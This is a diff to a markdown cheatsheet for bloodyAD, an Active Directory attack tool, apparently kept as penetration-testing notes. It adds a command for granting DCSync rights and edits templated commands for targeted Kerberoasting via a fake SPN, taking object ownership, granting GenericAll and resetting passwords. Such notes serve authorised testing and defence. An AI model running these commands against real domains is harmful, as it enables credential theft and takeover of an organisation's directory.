@@ -2,7 +2,7 @@
 title = "bloodyAD"
 +++
 
-* https://github.com/CravateRouge/bloodyAD
+* https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
 * https://seriotonctf.github.io/BloodyAD-Cheatsheet/index.html
 
 Modern Python tool for AD attack chains with various authentications and built for ACL abuse, password resets, and DACL manipulation.
@@ -59,7 +59,7 @@ bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> get object "DC=<D
 
 ## Modify
 
-### Reset Password
+### Change Password
 
 Requires `ForceChangePassword` ACL or higher on target.
 
@@ -101,7 +101,15 @@ bloodyAD -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC_FQDN> --dc-ip <DC_IP> 
 
 ## ACL Abuse Paths
 
-### `GenericAll` / `GenericWrite` (Targeted Kerberoast)
+### `GenericAll` / `GenericWrite`
+
+#### Enable `DCSync`
+
+```bash
+bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> add dcsync <TARGET_USER>
+```
+
+#### Enable Targeted Kerberoast
 
 With `WriteSPN` permission. Kerberoast after writing the SPN.
 
@@ -113,7 +121,7 @@ bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> get object divano
 bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> set object <TARGET_USER> servicePrincipalName -v 'fake/<TARGET_USER>'
 
 # Remove SPN
-bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> set object divanov servicePrincipalName
+bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> set object <TARGET_USER> servicePrincipalName
 ```
 
 ### `WriteOwner`: Take Ownership + Grant Rights
@@ -122,11 +130,10 @@ bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> set object divano
 # Take ownership
 bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> set owner <TARGET_USER> <USER>
 
-# Grant yourself GenericAll
+# Grant user GenericAll
 bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> add genericAll <TARGET_USER> <USER>
 
 # Reset password
-bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> set password <TARGET_USER> '<NEW_PASSWORD>'
 ```
 
 ### `AddSelf`: Add Self to Group
